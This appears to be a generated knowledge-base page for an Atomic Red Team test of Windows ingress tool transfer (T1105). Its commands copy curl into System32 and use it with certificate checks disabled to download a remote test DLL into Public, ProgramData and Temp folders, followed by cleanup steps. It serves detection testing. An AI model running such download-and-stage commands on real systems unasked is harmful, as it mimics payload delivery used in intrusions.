---
atomic_guid: "2b080b99-0deb-4d51-af0f-833d37c4ca6a"
title: "Curl Download File"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "2b080b99-0deb-4d51-af0f-833d37c4ca6a"
  - "Curl Download File"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Curl Download File

The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.
Expected output will include whether the file downloaded successfully or not.

## Metadata

- Atomic GUID: 2b080b99-0deb-4d51-af0f-833d37c4ca6a
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### curl_path

- description: path to curl.exe
- type: path
- default: C:\Windows\System32\Curl.exe

### file_download

- description: File to download
- type: string
- default: https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll

## Dependencies

Curl must be installed on system.

### Prerequisite Check

```powershell
if (Test-Path #{curl_path}) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl"
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
```

## Executor

- name: command_prompt

### Command

```cmd
#{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
#{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
#{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll
#{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
```

### Cleanup

```cmd
del c:\users\public\music\allthethingsx64.dll >nul 2>&1
del c:\users\public\music\allthethingsx64.dll >nul 2>&1
del c:\programdata\allthethingsx64.dll >nul 2>&1
del %Temp%\allthethingsx64.dll >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
